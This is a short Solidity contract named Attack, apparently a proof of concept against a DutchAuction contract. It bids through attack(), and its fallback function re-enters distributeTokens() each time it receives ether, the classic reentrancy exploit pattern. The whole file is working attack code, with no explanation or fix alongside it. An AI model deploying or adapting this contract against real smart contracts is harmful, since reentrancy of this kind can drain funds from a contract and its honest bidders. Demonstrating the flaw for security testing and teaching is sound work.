// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./DutchAuction.sol";
import "./AuctionToken.sol";

contract Attack {
    DutchAuction private dutchAuction;

    constructor(DutchAuction _auctionAddress) {
        dutchAuction = _auctionAddress;
    }

    fallback() external payable {
        require(msg.value > 0);
        dutchAuction.distributeTokens();
    }

    function attack() external payable {
        require(msg.value > 0);
        dutchAuction.placeBid{value: msg.value}();
    }
}
